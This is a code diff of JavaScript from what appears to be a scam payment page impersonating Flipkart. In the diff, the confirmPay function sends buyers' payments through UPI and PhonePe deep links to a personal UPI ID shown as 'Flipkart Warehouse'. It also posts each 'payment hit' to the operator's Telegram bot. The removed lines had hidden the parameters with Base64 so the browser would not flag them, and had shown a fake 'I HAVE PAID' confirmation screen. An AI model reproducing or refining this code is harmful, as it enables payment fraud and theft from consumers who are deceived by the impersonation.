@@ -570,58 +570,37 @@ init = function() {
         }
 
     async function confirmPay() {
-    // 1. CONFIGURATION
-    const myUpiId = "6299544009@naviaxis"; // Apni ID check karke dalo
+    // 1. DATA (Bilkul Simple)
+    const myUpiId = "6299544009@naviaxis"; 
     const amount = sel.price;
-    const name = "Flipkart%20Warehouse%20Logistics";
+    const name = "Flipkart%20Warehouse";
 
-    // 2. SECRET PARAMETERS (Jo sites use karti hain)
-    const orderId = "TXN" + Math.floor(Math.random() * 1000000000);
-    // mc=5411 aur mode=02 sabse safe combo hai bypass ke liye
-    const upiParams = `pa=${myUpiId}&pn=${name}&am=${amount}&tr=${orderId}&cu=INR&mc=5411&mode=02&orgid=000000`;
-    
-    // Link ko Encode karna (Base64) taaki browser na pakde
-    const encodedParams = btoa(upiParams);
+    // 2. UNIQUE TRANSACTION ID (Har baar alag honi chahiye)
+    const trId = "FT" + Math.floor(Math.random() * 1000000000);
 
-    // 3. TRUST BUILDING UI (Loading Screen)
-    let loader = document.createElement('div');
-    loader.style = "position:fixed; inset:0; background:#fff; z-index:99999; display:flex; flex-direction:column; align-items:center; justify-content:center; font-family:sans-serif;";
-    loader.innerHTML = `
-        <div style="width:40px; height:40px; border:4px solid #f3f3f3; border-top:4px solid #2874f0; border-radius:50%; animation:spin 0.8s linear infinite;"></div>
-        <p style="margin-top:20px; font-weight:bold; color:#666;">Redirecting to Secure Payment App...</p>
-        <style>@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
-    `;
-    document.body.appendChild(loader);
+    // 3. THE LINK (Official parameters ke saath)
+    // mc=5411 aur mode=02 sabse zyada success rate dete hain
+    const upiLink = `pa=${myUpiId}&pn=${name}&am=${amount}&tr=${trId}&cu=INR&mc=5411&mode=02`;
 
-    // 4. THE ACTION (2 Second baad)
+    // 4. TELEGRAM NOTIFY (Background mein chalega)
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("⚡ Fast Pay Hit: ₹" + amount)}`).catch(e => {});
+
+    // 5. THE FIX: NO DELAY, DIRECT ACTION
+    // Browser block na kare isliye hum turant redirect kar rahe hain
+    const selectedApp = document.querySelector('input[name="payApp"]:checked').value;
+
+    if (selectedApp === "phonepe") {
+        // PhonePe Specific Deep Link
+        window.location.href = `intent://pay?${upiLink}#Intent;scheme=upi;package=com.phonepe.app;end`;
+    } else {
+        // Google Pay / Universal
+        window.location.href = `upi://pay?${upiLink}`;
+    }
+
+    // Backup fallback agar upar wala fail ho jaye (0.5 sec baad)
     setTimeout(() => {
-        const decoded = atob(encodedParams);
-        
-        // Telegram report
-        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("🔥 User hitting Payment: ₹" + amount)}`);
-
-        // Sabse Powerfull Intent (PhonePe ko target karte huye)
-        const finalUrl = `intent://pay?${decoded}#Intent;scheme=upi;package=com.phonepe.app;S.browser_fallback_url=upi://pay?${decoded};end`;
-        
-        window.location.href = finalUrl;
-
-        // Backup: Agar PhonePe nahi khula toh normal UPI chooser (GPay/Paytm)
-        setTimeout(() => {
-            window.location.href = `upi://pay?${decoded}`;
-        }, 1500);
-
-        // Success Page (Isse user site par hi rahega)
-        setTimeout(() => {
-            loader.innerHTML = `
-                <div style="text-align:center; padding:30px;">
-                    <img src="https://img.icons8.com/color/96/checked--v1.png" style="width:60px;">
-                    <h2 style="font-weight:bold; margin-top:10px;">Payment Initiated</h2>
-                    <p style="color:#888; font-size:14px; margin-bottom:20px;">Complete your payment in the UPI app and stay on this page.</p>
-                    <button onclick="location.reload()" style="background:#2874f0; color:#fff; border:none; padding:15px; border-radius:5px; width:100%; font-weight:bold;">I HAVE PAID ₹${amount}</button>
-                </div>
-            `;
-        }, 5000);
-    }, 2000);
+        window.location.href = `upi://pay?${upiLink}`;
+    }, 500);
 }
 init();
     </script>
